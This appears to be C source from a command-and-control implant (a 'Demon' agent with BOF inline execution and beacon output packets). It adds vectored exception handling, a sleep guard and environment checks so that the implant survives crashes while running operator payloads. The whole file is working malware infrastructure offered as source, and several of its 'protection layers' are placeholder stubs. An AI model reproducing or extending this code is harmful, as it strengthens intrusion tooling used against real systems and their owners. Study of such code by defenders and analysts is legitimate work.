    if ( ! Instance->SleepGuard.VehHandle )
    {
        if ( ! InitializeSleepGuard() ) {
            PUTS( "SleepGuard init failed — falling back to direct VEH (no sleep protection)" )
            Instance->SleepGuard.VehHandle = Instance->Win32.RtlAddVectoredExceptionHandler( 1, GlobalAgentVEH );
        }
        PUTS( "Agent protection system initialized" )
    }

    // Initialize command execution timeout (60 seconds) - use file time instead
    FILETIME fileTime;
    Instance->Win32.GetSystemTimeAsFileTime( &fileTime );
    CurrentCommand.MaxExecutionTime.LowPart = fileTime.dwLowDateTime;
    CurrentCommand.MaxExecutionTime.HighPart = fileTime.dwHighDateTime;

    return Instance->SleepGuard.VehHandle;
}

// Execute command with comprehensive protection
BOOL ExecuteProtectedCommand( UINT32 CommandID, UINT32 RequestID, PVOID CommandFunction, PPARSER Parser )
{
    BOOL Success = FALSE;
    HANDLE ThreadHandle = NULL;
    DWORD ThreadId = 0;
    PROTECTED_COMMAND_CONTEXT Context = { 0 };
    
    if ( !CommandFunction )
    {
        PRINTF( "Invalid command function for CommandID: %x\n", CommandID );
        return FALSE;
    }
    
    PRINTF( "Executing command %x with protection (RequestID: %x)\n", CommandID, RequestID );
    
    // Initialize command context
    Context.CommandID = CommandID;
    Context.RequestID = RequestID;
    Context.CommandFunction = CommandFunction;
    Context.Parser = Parser;
    Context.Success = FALSE;
    Context.Failed = FALSE;
    Context.TimedOut = FALSE;
    
    // Set global command execution state for VEH protection
    CurrentCommand.RequestID = RequestID;
    CurrentCommand.CommandID = CommandID;
    CurrentCommand.IsExecuting = TRUE;
    CurrentCommand.Failed = FALSE;
    CurrentCommand.TimedOut = FALSE;
    
    // Determine protection level based on command type
    if ( IsHighRiskCommand( CommandID ) )
    {
        PRINTF( "High-risk command %x - using minimal VEH protection\n", CommandID );
        
        // **MINIMAL PROTECTION**: Just basic VEH protection without intrusive validation
        // This provides crash protection without interfering with normal BOF execution
        
        // Set execution state for VEH
        CurrentCommand.CommandThread = NULL;
        CurrentCommand.CommandThreadId = 0;
        
        // Execute with just VEH protection - no validation layers that could interfere
        PUTS( "Executing with minimal VEH protection..." );
        ((VOID(*)(PPARSER))CommandFunction)( Parser );
        
        // Assume success if no exception occurred (VEH would have caught exceptions)
        Success = !CurrentCommand.Failed;
    }
    else
    {
        PRINTF( "Standard command %x - direct execution with VEH\n", CommandID );
        
        // Execute directly with VEH protection
        DWORD ExecutionResult = SafeCommandExecutor( &Context );
        
        // Check context for actual success status (SafeCommandExecutor returns 0 for success)
        Success = Context.Success;
    }
    
    // Command completion - clean up any BOF watchdogs
    // Note: BOF watchdog cleanup is handled in CoffeeLdr.c via VEH and completion handlers
    // We just need to ensure request tracking here
    if ( Success || Context.Failed )
    {
        // **FIX**: Don't call AddHandledRequest for BOF commands since they handle their own completion packets
        // BOF commands send COMMAND_INLINEEXECUTE_RAN_OK/COULD_NO_RUN packets internally
        if ( CommandID != DEMON_COMMAND_INLINE_EXECUTE )
        {
            AddHandledRequest( RequestID );
        }
    }
    
    // Clear global command execution state
    CurrentCommand.IsExecuting = FALSE;
    CurrentCommand.CommandThread = NULL;
    CurrentCommand.CommandThreadId = 0;
    
    if ( Success )
    {
        PRINTF( "Command %x completed successfully\n", CommandID );
    }
    else if ( Context.TimedOut )
    {
        PRINTF( "Command %x timed out but agent protected\n", CommandID );
    }
    else
    {
        PRINTF( "Command %x failed but agent recovered\n", CommandID );
    }
    
    return Success;
}

// Cleanup agent protection system
VOID CleanupAgentProtection( PVOID VehHandle )
{
    /* If sleep guard was initialized, clean up the trampoline + control block.
     * Otherwise fall back to removing the direct VEH handle. */
    if ( Instance->SleepGuard.StubBase ) {
        CleanupSleepGuard();
    } else if ( VehHandle ) {
        Instance->Win32.RtlRemoveVectoredExceptionHandler( VehHandle );
    }
    PUTS( "Agent protection system cleaned up" );
}

// Send unknown command error
VOID SendUnknownCommandError( UINT32 CommandID )
{
    PRINTF( "Unknown command ID: %x - sending error\n", CommandID );
    PPACKAGE ErrorPackage = PackageCreate( BEACON_OUTPUT );
    PackageAddInt32( ErrorPackage, CALLBACK_ERROR_WIN32 );
#ifdef DEBUG
    PackageAddBytes( ErrorPackage, "Invalid operation - request denied", 32 );
#endif
    PackageTransmit( ErrorPackage );
}

// ============================================================================
// -SAFE AGENT PROTECTION IMPLEMENTATION
// ============================================================================

// Layer 1: Pre-execution environment validation
BOOL ValidateExecutionEnvironment( UINT32 CommandID, PPARSER Parser )
{
    // Check 1: Stack space validation
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    PVOID stackPointer = &mbi; // Use stack variable as reference
    
    if ( NT_SUCCESS( SysNtQueryVirtualMemory( NtCurrentProcess(), stackPointer, 
                                             MemoryBasicInformation, &mbi, sizeof(mbi), NULL ) ) )
    {
        // Ensure we have at least 64KB of stack space remaining
        SIZE_T stackSpaceUsed = (SIZE_T)((BYTE*)mbi.BaseAddress + mbi.RegionSize - (BYTE*)stackPointer);
        if ( stackSpaceUsed > (mbi.RegionSize - 0x10000) ) // Less than 64KB remaining
        {
            PUTS( "Insufficient stack space for safe execution" );
            return FALSE;
        }
    }
    
    // Check 2: Memory pressure validation
    SYSTEM_PERFORMANCE_INFORMATION perfInfo = { 0 };
    if ( NT_SUCCESS( SysNtQuerySystemInformation( SystemPerformanceInformation, 
                                                  &perfInfo, sizeof(perfInfo), NULL ) ) )
    {
        // Check if available memory is critically low (less than 50MB)
        if ( perfInfo.AvailablePages * 4096 < 0x3200000 ) // 50MB
        {
            PUTS( "System memory pressure too high for safe execution" );
            return FALSE;
        }
    }
    
    // Check 3: Validate parser data integrity
    if ( Parser && CommandID == DEMON_COMMAND_INLINE_EXECUTE )
    {
        // Basic sanity check on BOF data
        if ( Parser->Length > 0x1000000 ) // > 16MB seems suspicious
        {
            PUTS( "BOF data size exceeds safety threshold" );
            return FALSE;
        }
        
        // Check if parser buffer is in valid memory region
        if ( NT_SUCCESS( SysNtQueryVirtualMemory( NtCurrentProcess(), Parser->Buffer, 
                                                 MemoryBasicInformation, &mbi, sizeof(mbi), NULL ) ) )
        {
            if ( mbi.State != MEM_COMMIT || mbi.Protect == PAGE_NOACCESS )
            {
                PUTS( "BOF data in invalid memory region" );
                return FALSE;
            }
        }
    }
    
    return TRUE;
}

// Layer 2: Memory state backup (lightweight)
BOOL CreateMemoryStateBackup( VOID )
{
    // Simplified memory validation using available APIs
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    PVOID testAddress = &mbi; // Use stack variable as test
    
    // Basic memory accessibility check
    if ( NT_SUCCESS( SysNtQueryVirtualMemory( NtCurrentProcess(), testAddress, 
                                             MemoryBasicInformation, &mbi, sizeof(mbi), NULL ) ) )
    {
        // Ensure current memory region is accessible
        if ( mbi.State == MEM_COMMIT && mbi.Protect != PAGE_NOACCESS )
        {
            return TRUE;
        }
    }
    
    return TRUE; // Non-critical failure - continue execution
}

// Layer 4: Timer-based timeout monitor
HANDLE CreateTimeoutMonitor( UINT32 RequestID, UINT32 CommandID )
{
    // **SIMPLIFIED**: For now, just return NULL to disable timer monitoring
    // This can be enhanced later with proper timer implementation
    // The VEH and validation layers provide sufficient protection
    
    PUTS( "Timeout monitoring disabled (VEH protection active)" );
    return NULL;
}

// Timer callback for command timeout (simplified)
VOID CALLBACK TimeoutCallback( PVOID lpParam, BOOLEAN TimerOrWaitFired )
{
    // **SIMPLIFIED**: Placeholder function for timeout callback
    // Currently not used since timer monitoring is disabled
    // This prevents compilation errors
    
    PUTS( "Timeout callback triggered (placeholder)" );
}

// Layer 6: Cleanup timeout monitor
VOID CleanupTimeoutMonitor( HANDLE TimerQueue )
{
    // **SIMPLIFIED**: Since timeout monitoring is disabled, just log cleanup
    if ( TimerQueue )
    {
        PUTS( "Timeout monitor cleanup (placeholder)" );
    }
}

// ============================================================================
// Additional protection techniques
// ============================================================================

// Stack canary protection (lightweight alternative to full thread isolation)
BOOL ValidateStackIntegrity( VOID )
{
    // Simple stack canary check
    volatile DWORD stackCanary = 0xACCB32ED;
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    
    // Check if our stack canary is still intact
    if ( stackCanary != 0xACCB32ED )
    {
        PUTS( "Stack corruption detected!" );
        return FALSE;
    }
    
    // Check stack guard page
    if ( NT_SUCCESS( SysNtQueryVirtualMemory( NtCurrentProcess(), &stackCanary, 
                                             MemoryBasicInformation, &mbi, sizeof(mbi), NULL ) ) )
    {
        // Ensure we're not too close to stack limits
        if ( mbi.Protect & PAGE_GUARD )
        {
            PUTS( "Approaching stack guard page - unsafe to continue" );
            return FALSE;
        }
    }
    
    return TRUE;
}

// Resource monitoring (prevent resource exhaustion attacks)
BOOL ValidateResourceUsage( VOID )
{
    // **SIMPLIFIED**: Basic memory region validation using available APIs
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    SIZE_T totalCommitted = 0;
    PVOID address = NULL;
    DWORD regionCount = 0;
    
    // Count committed memory regions to detect excessive allocation
    while ( regionCount < 1000 ) // Prevent infinite loop
    {
        if ( !NT_SUCCESS( SysNtQueryVirtualMemory( NtCurrentProcess(), address, 
                                                  MemoryBasicInformation, &mbi, sizeof(mbi), NULL ) ) )
            break;
            
        if ( mbi.State == MEM_COMMIT )
        {
            totalCommitted += mbi.RegionSize;
        }
        
        address = (PVOID)((BYTE*)mbi.BaseAddress + mbi.RegionSize);
        regionCount++;
        
        // If we're using more than 500MB of committed memory, something might be wrong
        if ( totalCommitted > 0x1F400000 ) // 500MB
        {
            PUTS( "Excessive memory usage detected" );
            return FALSE;
        }
    }
    
    return TRUE;
}

// Execution context validation (ensure we're in expected context)
BOOL ValidateExecutionContext( VOID )
{
    // **SIMPLIFIED**: Basic thread and memory validation using available APIs
    
    // Check 1: Validate current thread context
    THREAD_BASIC_INFORMATION tbi = { 0 };
    if ( NT_SUCCESS( SysNtQueryInformationThread( NtCurrentThread(), ThreadBasicInformation, 
                                                  &tbi, sizeof(tbi), NULL ) ) )
    {
        // Ensure we're not suspended (ExitStatus should be STILL_ACTIVE = 259)
        if ( tbi.ExitStatus != 259 && tbi.ExitStatus != 0 )
        {
            PUTS( "Thread not in active state" );
            return FALSE;
        }
    }
    
    // Check 2: Validate current memory region is executable
    PVOID currentFunction = (PVOID)ValidateExecutionContext; // Use our own function as reference
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    if ( NT_SUCCESS( SysNtQueryVirtualMemory( NtCurrentProcess(), currentFunction, 
                                             MemoryBasicInformation, &mbi, sizeof(mbi), NULL ) ) )
    {
        // Ensure we're executing from proper code pages
        if ( !(mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) )
        {
            PUTS( "Executing from non-executable memory - possible corruption" );
            return FALSE;
        }
    }
    
    return TRUE;
}

// Enhanced command pre-validation
BOOL EnhancedCommandValidation( UINT32 CommandID, PPARSER Parser )
{
    // Layer 1: Basic safety checks
    if ( !ValidateExecutionEnvironment( CommandID, Parser ) )
        return FALSE;
    
    // Layer 2: Stack integrity check
    if ( !ValidateStackIntegrity() )
        return FALSE;
    
    // Layer 3: Resource usage validation
    if ( !ValidateResourceUsage() )
        return FALSE;
    
    // Layer 4: Execution context validation
    if ( !ValidateExecutionContext() )
        return FALSE;
    
    PUTS( "All enhanced validation checks passed" );
    return TRUE;
} 